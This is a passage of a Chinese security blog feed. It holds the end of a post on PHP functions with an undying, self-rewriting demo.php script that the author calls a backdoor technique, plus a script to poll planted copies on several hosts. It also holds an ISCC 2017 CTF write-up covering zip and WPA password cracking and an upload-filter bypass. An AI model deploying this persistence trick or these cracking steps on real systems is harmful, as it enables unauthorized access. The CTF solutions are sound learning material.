<h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bool set_time_limit ( int $seconds )</div></pre></td></tr></table></figure>
<p><code>seconds</code>最大的执行时间，单位为秒，默认值为30秒。如果设置为0（零），没有时间方面的限制。</p>
<h2 id="file-put-contents-函数"><a href="#file-put-contents-函数" class="headerlink" title="file_put_contents() 函数"></a>file_put_contents() 函数</h2><p>属于<a href="http://www.w3school.com.cn/php/php_ref_filesystem.asp" target="_blank" rel="external">Filesystem 函数</a>，这个允许访问和操作文件系统。</p>
<p>file_put_contents() 函数把一个字符串写入文件中。<br>与依次调用 fopen()，fwrite() 以及 fclose() 功能一样。</p>
<h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file_put_contents(file,data,mode,context)</div></pre></td></tr></table></figure>
<blockquote>
<p>file为必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。<br>data为可选。规定要写入文件的数据。可以是字符串、数组或数据流。<br>mode为可选。规定如何打开/写入文件。<br>context为可选。规定文件句柄的环境。</p>
</blockquote>
<p><img src="https://ooo.0o0.ooo/2017/05/07/590f29c8e3501.png" alt="1.png"></p>
<h2 id="usleep-函数"><a href="#usleep-函数" class="headerlink" title="usleep() 函数"></a>usleep() 函数</h2><p>usleep() 函数为杂项函数，作用为延迟代码执行若干微秒。</p>
<h3 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">usleep(microseconds)</div></pre></td></tr></table></figure>
<p><code>microseconds</code>是必需填写的。以微秒计的暂停时间。<br><img src="https://ooo.0o0.ooo/2017/05/07/590f27986bb92.png" alt="1.png"></p>
<h2 id="运用"><a href="#运用" class="headerlink" title="运用"></a>运用</h2><p>demo.php内容为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">ignore_user_abort(true);</div><div class="line">set_time_limit(0);</div><div class="line"></div><div class="line">$file = &apos;demo.php&apos;;</div><div class="line">$shell = &quot;&lt;?php phpinfo();?&gt;&quot;;</div><div class="line"> </div><div class="line">while (TRUE) &#123;</div><div class="line"> </div><div class="line">file_put_contents($file, $shell);</div><div class="line">system(&apos;chmod 777 demo.php&apos;);</div><div class="line"></div><div class="line">usleep(50);</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>这种小技巧在留后门上还是有些用的，种了多个demo.php，就可以批量获取demo.php界面内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$array = array(</div><div class="line">	&quot;192.168.xxx.xxx&quot;,</div><div class="line">	&quot;192.168.xxx.xxx&quot;</div><div class="line">);</div><div class="line">for($i=0;$i&lt;=1;$i++)&#123;</div><div class="line">$url = &quot;http://$array[$i]/demo.php&quot;;</div><div class="line">$contents = file_get_contents($url); </div><div class="line">echo &quot;$array[$i] &lt;br&gt;&quot;;</div><div class="line">echo &quot;$contents &lt;br&gt;&lt;br&gt;&quot;;</div><div class="line">&#125; </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;写一个关于&lt;code&gt;不死&lt;/code&gt;进程,其实也就是定时的进程，时间短那就是无限的启用着。&lt;br&gt;之前有些文章也有这一些函数，但是没有备注。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="Web安全" scheme="http://rcoil.me/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="http://rcoil.me/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>ISCC 2017 WriteUp</title>
    <link href="http://rcoil.me/2017/05/ISCC-2017/"/>
    <id>http://rcoil.me/2017/05/ISCC-2017/</id>
    <published>2017-05-01T07:08:04.000Z</published>
    <updated>2017-08-01T16:06:13.853Z</updated>
    
    <content type="html"><![CDATA[<p>CTF的启蒙ISCC-2017开始了。<br><a id="more"></a></p>
<h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><h3 id="Wheel-Cipher"><a href="#Wheel-Cipher" class="headerlink" title="Wheel Cipher"></a>Wheel Cipher</h3><p><img src="http://i2.muimg.com/567571/4ee9ea052c932688.png" alt=""><br><a href="http://pan.baidu.com/s/1mi8xZV6" target="_blank" rel="external">附件链接</a>： 密码：jgjk</p>
<p>题目就已经有提示了。是Wheel Cipher加密(轮密码)。<br><img src="http://i1.piimg.com/567571/f9e59642a37e8b02.png" alt=""></p>
<h3 id="神秘图片"><a href="#神秘图片" class="headerlink" title="神秘图片"></a>神秘图片</h3><p><img src="http://i1.piimg.com/567571/015d0169b92591d1.png" alt=""><br><a href="http://pan.baidu.com/s/1mhNGTYg" target="_blank" rel="external">附件链接</a>： 密码：f7w7<br>图片使用foremost工具分离，得出一张猪圈密码图<br><img src="http://i4.buimg.com/567571/2c3186082c18bd9c.png" alt=""></p>
<p>最后flag为<code>goodluck</code></p>
<h3 id="告诉你个秘密"><a href="#告诉你个秘密" class="headerlink" title="告诉你个秘密"></a>告诉你个秘密</h3><p><img src="http://i1.piimg.com/567571/b9660542167f2ad2.png" alt=""><br><a href="http://pan.baidu.com/s/1c6G6Xw" target="_blank" rel="external">附件链接</a>： 密码：4hv2<br>这个题目说是简单的加密，结果出来的都是要解密。<br>先对16进制转成字符串，观察字符串是base64加密的，再解密</p>
<p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">r5yG lp9I BjM tFhB</div><div class="line">T6uh y7iJ QsZ bhM</div></pre></td></tr></table></figure></p>
<p>参照键盘。<br>flag为：<code>TONGYUAN</code></p>
<h3 id="你猜猜。。"><a href="#你猜猜。。" class="headerlink" title="你猜猜。。"></a>你猜猜。。</h3><p><img src="http://i2.muimg.com/567571/927625b246960ad8.png" alt=""><br><a href="http://pan.baidu.com/s/1qY6oiGs" target="_blank" rel="external">附件链接</a>： 密码：atys<br>将16进制转字符，发现有pk字样。<br>然后用<code>HxD</code>将这十六进制保存为zip。<br>是一个加密的zip文件，猜123456弱口令得出flag。<br>flag为<code>daczcasdqwdcsdzasd</code></p>
<h3 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h3><p><img src="http://i4.buimg.com/567571/cbe72cc9ce8522db.png" alt=""><br><a href="http://pan.baidu.com/s/1dF6AA7f" target="_blank" rel="external">附件链接</a>： 密码：06wn<br>扫描二维码提示说路由器密码为flag，二维图片使用foremost工具分离，得出一张图和一个zip。<br>再对zip进行破解<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fcrackzip -b -c &apos;1&apos; -l 1-10 -u crack_this.zip</div></pre></td></tr></table></figure></p>
<p>密码为<code>20161114</code>,得到一个握手包和<code>破解记录</code>，然后写个脚本生成字典<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">a = open(<span class="string">'11.txt'</span>,<span class="string">'w'</span>)</div><div class="line">c=<span class="string">"QWERTYUIOPASDFGHJKLZXcVBNM1234567890"</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</div><div class="line">	<span class="keyword">for</span> ii <span class="keyword">in</span> c:</div><div class="line">		<span class="keyword">for</span> iii <span class="keyword">in</span> c:</div><div class="line">			<span class="keyword">for</span> iiii <span class="keyword">in</span> c:</div><div class="line">				cc=<span class="string">'ISCC'</span>+i+ii+iii+iiii</div><div class="line">				a.write(cc+<span class="string">'\n'</span>)</div></pre></td></tr></table></figure></p>
<p>既然是握手包，又是路由，那还是破解<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">aircrack-ng -w zidian.txt freedom-*.cap</div></pre></td></tr></table></figure></p>
<p><img src="http://i1.piimg.com/567571/4860d83267816a54.png" alt=""><br>flag为<code>ISCC16BA</code></p>
<h3 id="说我作弊，需要证据"><a href="#说我作弊，需要证据" class="headerlink" title="说我作弊，需要证据"></a>说我作弊，需要证据</h3><p><img src="http://i1.piimg.com/588926/e2c50e47d93f2b68.png" alt=""><br><a href="http://pan.baidu.com/s/1bpb6Rvx" target="_blank" rel="external">附件链接</a>： 密码：gey4<br>这道题有原题：<a href="https://github.com/RandomsCTF/write-ups/tree/master/Hack.lu%20CTF%202015/Creative%20Cheating%20%5Bcrypto%5D%20(150" target="_blank" rel="external">Creative Cheating [crypto] (150)</a>)</p>
<h3 id="公邮密码"><a href="#公邮密码" class="headerlink" title="公邮密码"></a>公邮密码</h3><p><img src="http://i4.buimg.com/588926/68003f9ea9f65796.png" alt=""><br><a href="http://pan.baidu.com/s/1i5ig8bb" target="_blank" rel="external">附件链接</a>： 密码：beaj<br>除了爆破还是爆破。<br><code>fcrackzip -b -c &#39;A&#39; -l 1-3 -u crack_this.zip</code><br>密码为<code>BIT</code>。<br>TXT里面为<code>RmxhZzp7THkzMTkuaTVkMWYqaUN1bHQhfQ==</code><br><code>Flag:{Ly319.i5d1f*iCult!}</code></p>
<h3 id="PHP-encrypt-1"><a href="#PHP-encrypt-1" class="headerlink" title="PHP_encrypt_1"></a>PHP_encrypt_1</h3><p><img src="http://i1.piimg.com/588926/199db5eca97c1130.png" alt=""><br><a href="http://pan.baidu.com/s/1o7InVvW" target="_blank" rel="external">附件链接</a>： 密码：6aa4<br>附件是一个加密脚本，那改一下就行了。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    $key = md5(<span class="string">'ISCC'</span>);</div><div class="line">    $data = base64_decode(<span class="string">'fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA='</span>);</div><div class="line"></div><div class="line">    $len = strlen($data);</div><div class="line">    $klen = strlen($key);</div><div class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123; </div><div class="line">        <span class="keyword">if</span> ($x == $klen)</div><div class="line">        &#123;</div><div class="line">            $x = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">        $char .= $key[$x];</div><div class="line">        $x+=<span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123;</div><div class="line">        $tmp  = ord($data[$i]) - ord($char[$i]) + <span class="number">128</span>;</div><div class="line">        $str .= chr($tmp &gt; <span class="number">128</span> ? $tmp<span class="number">-128</span>:$tmp);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">echo</span> $str;</div><div class="line"></div><div class="line">&#125;</div><div class="line">decrypt();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>或者用python都没有问题的。<br><img src="http://i1.piimg.com/588926/3836f057baed5746.png" alt=""><br>flag为<code>Flag:{asdqwdfasfdawfefqwdqwdadwqadawd}</code></p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="眼见非实"><a href="#眼见非实" class="headerlink" title="眼见非实"></a>眼见非实</h3><p><img src="http://i4.buimg.com/567571/ca76d58e460e5ea1.png" alt=""><br><a href="http://pan.baidu.com/s/1nvmbxsX" target="_blank" rel="external">附件链接</a>： 密码：4alx<br>打开发现是个docx文档。既然是Misc题，那隐写跑不掉了，而且去年的那到<code>毕业论文</code>也是这样。<br>但是这道题，在点开<code>document.xml</code>就见到flag。<br><img src="http://i1.piimg.com/567571/8c8bc136ecf7c907.png" alt=""><br>flag为<code>flag{F1@g}</code></p>
<h3 id="就在其中"><a href="#就在其中" class="headerlink" title="就在其中"></a>就在其中</h3><p><img src="http://i1.piimg.com/567571/783011093179c497.png" alt=""><br><a href="http://pan.baidu.com/s/1dFMP1iL" target="_blank" rel="external">附件链接</a>： 密码：nsue<br>是一个流量包,丢到wireshark对流量包进行分析，发先是有FTP协议，那就转用NetworkMiner。</p>
<p>把四个文件提取出来，有RSA的公钥和私钥，还有个key.zip。<br><img src="http://i4.buimg.com/567571/013f3d84f7b4cf2a.png" alt=""></p>
<p>用私钥解就可以了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">openssl rsautl -decrypt -in key.txt -inkey test.key -out 1.txt</div></pre></td></tr></table></figure></p>
<p>flag为<code>haPPy_Use_0penSsI</code><br><img src="http://i1.piimg.com/567571/a42f21c7b840756e.png" alt=""></p>
<h3 id="很普通的Disco"><a href="#很普通的Disco" class="headerlink" title="很普通的Disco"></a>很普通的Disco</h3><p><img src="http://i4.buimg.com/567571/da54c4c7d9dd52cd.png" alt=""><br><a href="http://pan.baidu.com/s/1i5mj7wD" target="_blank" rel="external">附件链接</a>： 密码：1w2d</p>
<p>大大音频，用Audacity打开。<br>纵观全局没有那个地方是可疑的，那就再放大。</p>
<p>在最前面的发现了、<br><img src="http://i4.buimg.com/567571/9b0f465230134eea.png" alt=""><br>高为1低为0。<br>总共105个，分成15组每组7个。<br><code>flag{W0W*funny}</code></p>
<h3 id="很普通的数独"><a href="#很普通的数独" class="headerlink" title="很普通的数独"></a>很普通的数独</h3><p><img src="http://i1.piimg.com/567571/d6e03816e21e01e1.png" alt=""><br>附件：<a href="http://pan.baidu.com/s/1qYHd9FY" target="_blank" rel="external">链接</a> 密码：el7r<br>以数独混淆，其实是将这25张图组成<code>5*5</code>的二维码。<br><img src="https://ooo.0o0.ooo/2017/05/08/590ff6edd762f.png" alt="QQ图片20170508101652.png"><br>先把这三张图互换位置。<br>补脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python3</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> pytesseract</div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_qr_list</span><span class="params">()</span>:</span></div><div class="line">    </div><div class="line">    qr_list = list()</div><div class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">5</span> * <span class="number">9</span>):</div><div class="line">        qr_list.append(list())</div><div class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">5</span> * <span class="number">9</span>):</div><div class="line">            qr_list[a].append(<span class="number">0</span>)</div><div class="line"></div><div class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> range(<span class="number">5</span>):</div><div class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> range(<span class="number">5</span>):</div><div class="line">            fname = <span class="string">'%s.png'</span> % (e * <span class="number">5</span> + f + <span class="number">1</span>) </div><div class="line">            </div><div class="line">            img = Image.open(fname).convert(<span class="string">'L'</span>)</div><div class="line"></div><div class="line">            sx, sy, ex, ey, tx = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span></div><div class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">9</span>):</div><div class="line">                ty = <span class="number">2</span></div><div class="line">                tx += <span class="number">1</span></div><div class="line">                sx = x * <span class="number">22</span> + tx + <span class="number">1</span> </div><div class="line">                <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">9</span>):</div><div class="line">                    ty += <span class="number">1</span></div><div class="line">                    sy = y * <span class="number">21</span> + ty + <span class="number">1</span> </div><div class="line">                    ex, ey = sx + <span class="number">20</span>, sy + <span class="number">19</span></div><div class="line">                                    </div><div class="line">                    img_temp = img.crop((sx, sy, ex, ey))</div><div class="line">                    </div><div class="line">                    code = pytesseract.image_to_string(img_temp, config=<span class="string">"-psm 5"</span>)</div><div class="line">                    </div><div class="line">                    <span class="keyword">if</span> code!=<span class="string">''</span>:</div><div class="line">                        qr_list[f * <span class="number">9</span> + x][e * <span class="number">9</span> + y] = <span class="number">1</span> </div><div class="line">                    </div><div class="line">                    print(qr_list[f * <span class="number">9</span> + x][e * <span class="number">9</span> + y], (x, y), (sx, sy, ex, ey), (e, f, x, y))</div><div class="line">                    </div><div class="line">    <span class="keyword">return</span> qr_list</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_qr_image</span><span class="params">(qr_list)</span>:</span></div><div class="line">    img = Image.new(<span class="string">'L'</span>, (<span class="number">10</span> * <span class="number">47</span>, <span class="number">10</span> * <span class="number">47</span>), (<span class="number">255</span>))</div><div class="line">    draw = ImageDraw.Draw(img)</div><div class="line"></div><div class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> range(<span class="number">5</span> * <span class="number">9</span>):</div><div class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> range(<span class="number">5</span> * <span class="number">9</span>):</div><div class="line">            <span class="keyword">if</span> qr_list[f][e]: </div><div class="line">                draw.rectangle(((e + <span class="number">1</span>) * <span class="number">10</span>, (f + <span class="number">1</span>) * <span class="number">10</span>, (e + <span class="number">2</span>) * <span class="number">10</span>, (f + <span class="number">2</span>) * <span class="number">10</span> ), fill=(<span class="number">0</span>))</div><div class="line">                </div><div class="line">            print(qr_list[f][e], <span class="string">' '</span>, end=<span class="string">''</span>)</div><div class="line">        print()</div><div class="line">        </div><div class="line">    img.save(<span class="string">'flag.png'</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    get_qr_image(get_qr_list())</div></pre></td></tr></table></figure></p>
<p><img src="https://ooo.0o0.ooo/2017/05/08/590ff6edc2b04.png" alt="flag.png"><br>扫描得出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Vm0xd1NtUXlWa1pPVldoVFlUSlNjRlJVVGtOamJGWnlWMjFHVlUxV1ZqTldNakZIWVcxS1IxTnNhRmhoTVZweVdWUkdXbVZHWkhOWGJGcHBWa1paZWxaclpEUmhNVXBYVW14V2FHVnFRVGs9</div></pre></td></tr></table></figure></p>
<p>flag为：<code>flag{y0ud1any1s1}</code></p>
<h3 id="再见李华"><a href="#再见李华" class="headerlink" title="再见李华"></a>再见李华</h3><p><img src="http://i2.muimg.com/588926/48ccd900e35934fa.png" alt=""><br><a href="http://pan.baidu.com/s/1sl4kPfn" target="_blank" rel="external">附件链接</a>： 密码：papu<br>附件中是一张图片，foremost将zip提出来，打开需要密码。<br>这个题目就略坑了，满满的都是脑洞，没有特殊字符，是指密码中没有特殊字符。而不少于<code>1000</code>个字，这个1000是8的二进制，所以密码是9位或9位以上，最后署名，意思是密码中后面5位数是Lihua。利用之前的脚本直接生成一个，但是<code>fcrackzip</code>抽风怎么都破解不出来。<br>最后用<code>Advanced ZIP Password Recovery_4.0</code>进行破解。<br>最后密码为<code>15CCLiHua</code><br>或者直接暴力破解吧，花的是时间。<br>附脚本：<br><img src="http://i4.buimg.com/588926/56dce94288c614e9.png" alt=""><br>flag为<code>Stay hungry, Stay foolish.</code></p>
<h3 id="寻”文”启事"><a href="#寻”文”启事" class="headerlink" title="寻”文”启事"></a>寻”文”启事</h3><p><img src="https://ooo.0o0.ooo/2017/05/22/592302f03ce93.png" alt="1.png"><br><a href="http://pan.baidu.com/s/1boDQX4r" target="_blank" rel="external">附件链接</a>： 密码：tzli</p>
<p>从<code>getflag.py</code>来看，需要5个32位的字符串，从所有的文本文件中找出了13个，进行排列。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> binascii</div><div class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</div><div class="line"></div><div class="line">ii = open(<span class="string">'ii.txt'</span>,<span class="string">'w'</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuc_1</span><span class="params">()</span>:</span></div><div class="line">    s = set()</div><div class="line"></div><div class="line">    pattern = re.compile(<span class="string">r'[0-9a-f]&#123;32&#125;'</span>)</div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">6000</span>):</div><div class="line">        fname = <span class="string">'./data/%s.txt'</span> % i</div><div class="line">        </div><div class="line">        <span class="keyword">with</span> open(fname, <span class="string">'rt'</span>) <span class="keyword">as</span> fs:</div><div class="line">            tmp = fs.read()</div><div class="line">            match = pattern.match(tmp)</div><div class="line">            </div><div class="line">            <span class="keyword">if</span> match:</div><div class="line">                s.add(match.group())</div><div class="line">    </div><div class="line">    <span class="keyword">return</span> s</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuc_2</span><span class="params">(s)</span>:</span></div><div class="line">    </div><div class="line">    tmp = permutations(list(s), <span class="number">5</span>)</div><div class="line">    </div><div class="line">    <span class="keyword">for</span> a, b, c, d, e <span class="keyword">in</span> tmp:</div><div class="line">        fuc_c(a, b, c, d, e)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuc_c</span><span class="params">(a, b, c, d, e)</span>:</span></div><div class="line">    Flag = <span class="string">''</span></div><div class="line"></div><div class="line">    File1_rc = binascii.unhexlify(a)</div><div class="line">    File2_rc = binascii.unhexlify(b)</div><div class="line">    File3_rc = binascii.unhexlify(c)</div><div class="line">    File4_rc = binascii.unhexlify(d)</div><div class="line">    File5_rc = binascii.unhexlify(e)</div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">16</span>):</div><div class="line">        temp = ord(File1_rc[i]) + ord(File2_rc[i]) + ord(File3_rc[i]) + ord(File4_rc[i]) + ord(File5_rc[i])</div><div class="line">        Flag = Flag + chr((temp % <span class="number">255</span>))</div><div class="line"></div><div class="line">    jj = <span class="string">"Flag:&#123;"</span> + binascii.hexlify(Flag)+ <span class="string">"&#125;"</span></div><div class="line">    <span class="comment">#print "Flag:&#123;" + binascii.hexlify(Flag) + "&#125;"</span></div><div class="line">    <span class="keyword">print</span> jj</div><div class="line">    ii.write(jj+<span class="string">'\n'</span>)</div><div class="line">fuc_2(fuc_1())</div></pre></td></tr></table></figure></p>
<p>最后的结果为1287个，但是没有正确的flag，求hit。</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="WelcomeToMySQL"><a href="#WelcomeToMySQL" class="headerlink" title="WelcomeToMySQL"></a>WelcomeToMySQL</h3><p><img src="http://i1.piimg.com/567571/2a463ee68264b48b.png" alt=""><br>测试后上传<code>php5</code>成功，查看源代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">"file"</span>]))&#123;</div><div class="line">                <span class="keyword">if</span>(preg_match(<span class="string">"/\.php[2,3,4]$/"</span>,$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))</div><div class="line">                        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("You are a good man")&lt;/script&gt;'</span>;</div><div class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/\.php$/"</span>,$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))</div><div class="line">                        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("You are a good man")&lt;/script&gt;'</span>;</div><div class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/\.phtml$/"</span>,$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))</div><div class="line">                        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("phtml does not work ")&lt;/script&gt;'</span>;</div><div class="line">                <span class="keyword">else</span> <span class="keyword">if</span>($file=$_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>])&#123;</div><div class="line">			move_uploaded_file($file, <span class="string">"/var/www/html/web-01/upload/"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</div><div class="line">                        <span class="keyword">echo</span> <span class="string">"uploaded successfully!"</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">			<span class="keyword">echo</span> <span class="string">'&lt;!--$servername,$username,$password,$db,$tb were set in base.php--&gt;'</span>;</div><div class="line">                        <span class="keyword">echo</span> <span class="string">"Your file stored in: "</span>.<span class="string">"upload/"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</div><div class="line">                &#125;</div><div class="line">        &#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;html&gt;</div><div class="line">        &lt;body&gt;</div><div class="line">                &lt;form action=<span class="string">"index.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</div><div class="line">                        file:&lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> /&gt;&lt;br/&gt;</div><div class="line">                        &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"upload"</span> /&gt;</div><div class="line">                &lt;/form&gt;</div><div class="line">        &lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>确实就还剩下常规的php5和pht没有没被限制。<br>根据提示的信息就是flag在数据库里面。用<code>cat base.php</code>读取配置从而进行连接。<br>flag：<code>Flag:{Iscc_1s_Fun_4nd_php_iS_Easy}</code></p>
